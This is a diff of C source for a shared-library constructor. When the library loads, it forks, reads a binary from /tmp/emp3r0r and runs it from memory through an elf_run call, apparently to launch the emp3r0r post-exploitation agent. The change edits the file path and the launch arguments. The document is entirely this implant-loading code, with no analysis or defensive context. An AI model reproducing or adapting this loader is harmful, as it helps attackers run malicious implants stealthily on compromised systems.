@@ -10,7 +10,7 @@ void __attribute__((constructor)) initLibrary(void)
     pid_t child = fork();
     if (child == 0) {
         puts("In child process");
-        FILE* f = fopen("emp3r0r", "rb");
+        FILE* f = fopen("/tmp/emp3r0r", "rb");
 
         fseek(f, 0, SEEK_END);
         int size = ftell(f);
@@ -23,7 +23,7 @@ void __attribute__((constructor)) initLibrary(void)
         /* printf("main: %p\n", elf_sym(buf, "main")); */
 
         // Run the ELF
-        char* argv[] = { "emp3r0r", "-replace", NULL };
+        char* argv[] = { "emp3r0r", NULL };
         char* envv[] = { "PATH=/bin:/usr/bin:/sbin:/usr/sbin", "HOME=/tmp", NULL };
         elf_run(buf, argv, envv);
     }
